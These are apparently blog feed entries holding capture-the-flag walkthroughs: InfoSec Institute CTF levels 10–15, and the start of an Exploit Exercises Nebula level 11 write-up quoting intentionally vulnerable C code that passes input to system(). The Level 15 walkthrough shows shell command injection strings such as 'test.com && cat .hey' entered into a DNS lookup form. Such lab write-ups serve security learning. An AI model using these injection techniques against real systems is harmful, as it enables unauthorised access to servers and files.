&lt;/p&gt;

&lt;p&gt;Now you can go to the levelnine url and enter that to get the flag. Either way should
be valid, as the aim of the game is to get the flag. It shouldn&amp;rsquo;t matter how you get it :)&lt;/p&gt;

&lt;p&gt;Level15 has been a huge help in all of this!&lt;/p&gt;

&lt;h2 id=&#34;level-10:aad69195db02279e47989643f4843312&#34;&gt;Level 10&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelten.php&#34;&gt;http://ctf.infosecinstitute.com/levelten.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QENqipl.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s listen to the sound. Hrmm Squeaky. Could be anything. Maybe some weirdly pitched morse.
But let&amp;rsquo;s download and open it in Audacity. My initial hunch is that it&amp;rsquo;s sped up, due
to the highpitched sound. So I started reducing the playback speed, and it turns out that
at around 0.15 times the original speed, we hear someone talking. He&amp;rsquo;s actually telling us
the name of the flag&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sound
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks kind stranger&lt;/p&gt;

&lt;h2 id=&#34;level-11:aad69195db02279e47989643f4843312&#34;&gt;Level 11&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleleven.php&#34;&gt;http://ctf.infosecinstitute.com/leveleleven.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/L2tFy5t.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hrmm.. there&amp;rsquo;s no sound this time, instead we get the PHP logo. Well, it&amp;rsquo;s all
we have so let&amp;rsquo;s open it up. I loaded it into vim, changed to hex mode (:%!xxd)
and right at the top we have&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, that won&amp;rsquo;t be it will it? We&amp;rsquo;re very familiar with base64 now aren&amp;rsquo;t we? Ok, decode&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open it up and we get an image. Because the domain is outside of the control of
this CTF, we can assume that the image hasn&amp;rsquo;t been tampered with or anything
is embedded in it and that the actual flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_powerslide
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll take it, thanks!&lt;/p&gt;

&lt;h2 id=&#34;level-12:aad69195db02279e47989643f4843312&#34;&gt;Level 12&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwelve.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwelve.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WdLl96v.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok we recognise this image. We had it in level 1 and we had to look at the source.
Our clue is dig deeper and that could mean a number of things. Let&amp;rsquo;s try some directory
traversal by appending a slash and some random text at the end. Hrm, we just
get a list of the levels and no css. Ok, that&amp;rsquo;s not it. Let&amp;rsquo;s dig into the source again.
There&amp;rsquo;s nothing obvious, but I reckon it might be one of the files included in the source.
It would make sense given the clue we&amp;rsquo;ve been given.&lt;/p&gt;

&lt;p&gt;To cut a long story short, there&amp;rsquo;s a css file &lt;code&gt;design.css&lt;/code&gt; that&amp;rsquo;s not included
in the other pages. I know this because I&amp;rsquo;ve pretty much looked at the source for each
level. Force of habit. Anyway, let&amp;rsquo;s take a look at it:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;.thisloveis&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;#696e666&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;f7365635f666c616769735f686579696d6e6f7461636f6c6f72;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha, that&amp;rsquo;s not a valid colour is it? It&amp;rsquo;s also not base64. Looks like hex values
to me. Run it through a hex to text converter and&amp;hellip;..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_heyimnotacolor
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, you weren&amp;rsquo;t a colour, that&amp;rsquo;s for sure.&lt;/p&gt;

&lt;h2 id=&#34;level-13:aad69195db02279e47989643f4843312&#34;&gt;Level 13&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthirteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelthirteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JX3Je1g.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Ok, this was a bit of a cheat, because I skipped to level 15 and now I have a a few more
tools available. I ran &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la ..&lt;/code&gt; and voila, there&amp;rsquo;s the backup file:
&lt;code&gt;levelthirteen.php.old&lt;/code&gt;. Much easier than guessing, right?
Looking at this file we see it will prompt us to download a file called &lt;code&gt;misc/imadecoy&lt;/code&gt;.
This seems to be a network capture involving a project called &lt;a href=&#34;https://github.com/shipcod3/honeypy&#34;&gt;HoneyPy&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I opened it up in wireshark and spent quite a bit of time on it. There&amp;rsquo;s really nothing
interesting in it for the most part. However near the end we get a PNG image called
&lt;code&gt;HoneyPY.PNG&lt;/code&gt;. For some reason this just stood out to me. I took a chance and exported it
by rightclicking the packet and selecting &lt;code&gt;Export Selected Packet Bytes&lt;/code&gt; as shown&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jhH2v19.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Opening this image surprises us with a flag! W00t! That flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_morepackets
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A wireshark level I managed to do. Yay&lt;/p&gt;

&lt;h2 id=&#34;level-14:aad69195db02279e47989643f4843312&#34;&gt;Level 14&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfourteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelfourteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/0akB0Ni.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;UPDATE: The &lt;code&gt;level14.db&lt;/code&gt; file has been removed and the &lt;code&gt;misc&lt;/code&gt; directory can
no longer be listed. Use the second method below to solve this level&lt;/p&gt;

&lt;p&gt;Once downloaded we get a database backup file. This one was quite interesting because
there are two places where the flag is. So first I looked at what else is in the
&lt;code&gt;misc&lt;/code&gt; directory where this file lives. There&amp;rsquo;s a &lt;code&gt;level14.db&lt;/code&gt; file. Let&amp;rsquo;s
take a look at that.&lt;/p&gt;

&lt;p&gt;It adds an entry to the flag db. It&amp;rsquo;s a hex string, so like above, simply decode it and
get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_whatsorceryisthis
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But, look at the &lt;code&gt;level14&lt;/code&gt; file again. Scroll through and notice that in the
&lt;code&gt;friends&lt;/code&gt; table there&amp;rsquo;s a fimilar entry. Decoding that will also give you the flag.&lt;/p&gt;

&lt;h2 id=&#34;level-15:aad69195db02279e47989643f4843312&#34;&gt;Level 15&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfifteen/index.php&#34;&gt;http://ctf.infosecinstitute.com/levelfifteen/index.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EVJuDmC.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;So here we can lookup a dns entry by typing a domain in the text field. So let&amp;rsquo;s try
that and see what we get. I used &lt;code&gt;test.com&lt;/code&gt; and as a result I get the output
from the &lt;code&gt;dig&lt;/code&gt; command. Interesting. It could be that the php script is merely
calling &lt;code&gt;dig&lt;/code&gt; with the search term appended to it. This is a bad way to execute
a command, and we will see why. In Linux you can append a command to another using &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;.
So let&amp;rsquo;s try listing the directory with &lt;code&gt;test.com&amp;amp;&amp;amp;ls&lt;/code&gt; as our search query. Sure enough,
we see &lt;code&gt;index.php&lt;/code&gt; at the bottom of the output. Well, perhaps there&amp;rsquo;s some hidden files so
let&amp;rsquo;s run &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la&lt;/code&gt;. Aha, there&amp;rsquo;s a file called &lt;code&gt;.hey&lt;/code&gt;, let&amp;rsquo;s cat that with
&lt;code&gt;test.com &amp;amp;&amp;amp; cat .hey&lt;/code&gt; and we get &lt;code&gt;Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Not sure however where to go from here. The ZlibC at the end of the string might
be a clue.&lt;/p&gt;

&lt;p&gt;Please leave any comments with ideas on this. I&amp;rsquo;m a bit stumped.&lt;/p&gt;

&lt;p&gt;UPDATE: Turns out it&amp;rsquo;s Atom 128 adn you can use &lt;a href=&#34;http://crypo.in.ua/tools/eng_atom128c.php&#34;&gt;this site&lt;/a&gt;
to decode it to &lt;code&gt;infosec_flagis_rceatomized&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Thanks to Anon and @fr1t3 for the info&lt;/p&gt;

&lt;p&gt;ALL FLAGS DONE&lt;/p&gt;

&lt;h2 id=&#34;the-lost-level:aad69195db02279e47989643f4843312&#34;&gt;The lost level&lt;/h2&gt;

&lt;p&gt;UPDATED: This has since been removed, but I&amp;rsquo;ve left this here for posterity.&lt;/p&gt;

&lt;p&gt;Not sure where this belongs, but in the misc folder is a file called &lt;code&gt;readme.wav&lt;/code&gt;
which contains the morsecode for&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSECODETONES
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Which level this belongs to, I don&amp;rsquo;t know.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Cracking Nebula Part 2</title>
      <link>http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/</link>
      <pubDate>Wed, 02 Jul 2014 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/</guid>
      <description>

&lt;p&gt;On &lt;a href=&#34;http://www.exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I&amp;rsquo;ve been working
my way through the Nebula machine and figured I might as well write
up the process both for other&amp;rsquo;s benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.&lt;/p&gt;

&lt;p&gt;This continues on from &lt;a href=&#34;http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/&#34;&gt;part 1&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;level-11:eaf9fabfe6e85567a2c1f06adf83e2d8&#34;&gt;Level 11&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.&lt;/p&gt;

&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;/*&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt; * Return a random, non predictable file, and return the file descriptor for it.&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt; */&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;getrand&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;path)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;tmp;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;srandom(time(NULL));&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;tmp&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;pid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getpid();&lt;/span&gt;
  
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;asprintf(path,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tmp,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pid,&lt;/span&gt; 
    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; 
    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt;
    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(random()&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;));&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;path,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_CREAT&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDWR,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0600&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;unlink(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;path);&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;process&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;key;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0xff&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;key;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[i];&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(buffer);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define CL &amp;quot;Content-Length: &amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;line[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;mem;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;path;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fgets(line,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(line),&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;stdin)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;errx(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;reading from stdin&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(strncmp(line,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;CL,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(CL))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;errx(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;invalid header&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;atoi(line&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(CL));&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(length&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buf))&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(fread(buf,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;stdin)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;length)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
